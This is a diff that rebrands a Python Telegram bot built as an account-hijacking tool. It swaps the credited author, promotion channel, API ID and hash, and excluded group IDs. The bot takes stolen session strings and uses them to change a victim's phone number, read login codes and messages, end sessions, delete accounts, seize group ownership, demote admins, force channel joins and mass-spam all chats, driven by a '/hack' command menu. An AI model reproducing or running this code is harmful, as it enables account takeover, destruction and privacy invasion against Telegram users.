@@ -1,5 +1,4 @@
-
-# COPYRIGHT © 2022 BY BABLOO/@DEV_BABLOO 🔥
+# COPYRIGHT © 2022 BY BABLOO/@ALMORTAGEL_12 🔥
 # NOW PUBLIC BY BABLOO
 import os
 os.system("pip install -U telethon")
@@ -27,17 +26,17 @@ bot = borg = client
 
 Arabihack = 5341342370
 
-Bot_Username =os.environ.get("BOT_USERNAME", None) or "SESSION_H_A_K_BOT"
+Bot_Username =os.environ.get("BOT_USERNAME", None) or "RV6VRBOt"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     bot = client = X
     try:
-      await bot(join("@BA_BLOO"))
+      await bot(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await bot(join("@BA_BLOO"))
+      await bot(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -59,14 +58,14 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     bot = client = X
     try:
-      await bot(join("@BA_BLOO"))
+      await bot(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await bot(join("@BA_BLOO"))
+      await bot(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -89,14 +88,14 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     k = await X.get_me()
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -110,13 +109,13 @@ async def userinfo(strses):
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("BA_BLOO"))
+      await X(join("AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -131,13 +130,13 @@ async def terminate(strses):
 
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -147,13 +146,13 @@ async def delacc(strses):
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -170,13 +169,13 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -194,13 +193,13 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -220,13 +219,13 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -241,13 +240,13 @@ async def joingroup(strses, username):
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -261,13 +260,13 @@ async def leavegroup(strses, username):
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -283,21 +282,21 @@ async def delgroup(strses, username):
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     i = ""
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -315,13 +314,13 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -342,13 +341,13 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
-      await X(join("@BA_BLOO"))
+      await X(join("@AlmortagelTech"))
     except BaseException:
       pass
     try:
@@ -373,7 +372,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "BA_BLOO"
+channel = "AlmortagelTech"
 menu = '''
 
 "A" :✰︎ [معرفه قنوات/جروبات التي يملكها]
@@ -404,10 +403,10 @@ menu = '''
 
 "N" :✰︎ [لارسال رساله داخل الحساب عن طريق كود ترمكس] 
 
-انتظرو مميزات اكثر قريبا مطور البوت DEV_BABLOO.t.me
+انتظرو مميزات اكثر قريبا مطور البوت ALMORTAGEL_12.t.me
 '''
 mm = '''
-ملاحظه انضم اولا للدعم @BA_BLOO
+ملاحظه انضم اولا للدعم @AlmortagelTech
 '''
 
 keyboard = [
@@ -432,7 +431,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("༗𓌹𓏺 𝖥𝗈𝗋 Ⴆᥲ️Ⴆᥣ᥆᥆ . 💸 ˼ 𓌺", "https://t.me/DEV_BABLOO")
+    Button.url("ᯓ 𓆩 ˹ ᴍʀ ᴇʟᴍᴏʀᴛᴀɢᴇʟ ˼⍣⃝🇾🇪𓆪𓆃", "https://t.me/ALMORTAGEL_12")
     ]
 ]
 
@@ -449,7 +448,7 @@ async def op(event):
   else:
     legendbye = [
       [
-        Button.url("➪︎𝐒𝐎𝐔𝐑𝐂𝐄 𝐁𝐀𝐁𝑳𝐎𝐎⚙", f"https://t.me/BA_BLOO")
+        Button.url("➪︎ѕᴏụʀᴄᴇ ᴀʟᴍᴏʀᴛᴀɢᴇʟ⚙", f"https://t.me/AlmortagelTech")
         ]
       ]
     await event.reply("✰ اولا انضم الى القناه!\n✰ بعدها جرب ترسل /hack", buttons=legendbye)
@@ -491,7 +490,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("༗𓌹𓏺 𝖥𝗈𝗋 Ⴆᥲ️Ⴆᥣ᥆᥆ . 💸 ˼ 𓌺", "https://t.me/DEV_BABLOO")
+        Button.url("ᯓ 𓆩 ˹ ᴍʀ ᴇʟᴍᴏʀᴛᴀɢᴇʟ ˼⍣⃝🇾🇪𓆪𓆃", "https://t.me/ALMORTAGEL_12")
         ]
     ]
     await x.send_message(f"اختر ما تريد فعله معه الجلسه \n\n{menu}", buttons=keyboard)
@@ -512,7 +511,7 @@ async def users(event):
         return await event.reply("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @DEV_BABLOO")
+        file.write(i + "\n\nDetails BY @ALMORTAGEL_12")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -708,7 +707,7 @@ async def users(event):
         else:
           await event.respond("هناك خطأ ما حصل")
       except Exception as e:
-        await event.respond("ارسل المشكله الى لحلها- @DEV_BABLOO\n**LOGS**\n" + str(e))
+        await event.respond("ارسل المشكله الى لحلها- @ALMORTAGEL_12\n**LOGS**\n" + str(e))
 
 
 
@@ -721,7 +720,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("༗𓌹𓏺 𝖥𝗈𝗋 Ⴆᥲ️Ⴆᥣ᥆᥆ . 💸 ˼ 𓌺", "https://t.me/DEV_BABLOO")
+        Button.url("ᯓ 𓆩 ˹ ᴍʀ ᴇʟᴍᴏʀᴛᴀɢᴇʟ ˼⍣⃝🇾🇪𓆪𓆃", "https://t.me/ALMORTAGEL_12")
         ]
     ]
     await event.reply("الان اعطني الامر التي تريد ان تستخدمه للاذاعه\n✰ للكل - اختر a\n✰ للجروبات - اختر b\n✰ للخاص - اختر c", buttons=keyboard)
@@ -729,7 +728,7 @@ async def start(event):
 
 
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -757,7 +756,7 @@ async def gcasta(strses, msg):
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
-                    elif chat == -1001606996743:
+                    elif chat == -1001622606659:
                         pass
                     await asyncio.sleep()
                 except Exception as e:
@@ -785,7 +784,7 @@ async def users(event):
 molb = True
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -794,7 +793,7 @@ async def gcastb(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001606996743:
+                        if chat != -1001622606659:
                             await X.send_message(chat, tol, file=file)
                             await asyncio.sleep(60)
                             await X.send_message(chat, tol, file=file)
@@ -882,7 +881,7 @@ async def gcastb(strses, msg):
                             while molb != False:
                                 await asyncio.sleep(600)
                                 await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
-                        elif chat == -1001606996743:
+                        elif chat == -1001622606659:
                             pass
                     except Exception as e:
                         print(e)
@@ -907,7 +906,7 @@ async def users(event):
       await event.reply(f"تم الارسال في {i} جروب 😗😗.\n/hack", buttons=keyboard)
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 14911221, "a5e14021456afd496e7377331e2e5bcf") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -941,5 +940,5 @@ async def users(event):
       i = await gcastc(strses.text, msg.text)
       await event.reply(f"تم ارسال الرسال في {i} الخاص😗😗.\n/hack", buttons=keyboard)
 
-print(" لقد تم تنصيب البوت بنجاح.     للمساعده راسل المعرف التالي. @DEV_BABLOO")
+print(" لقد تم تنصيب البوت بنجاح.     للمساعده راسل المعرف التالي. @ALMORTAGEL_12")
 client.run_until_disconnected()
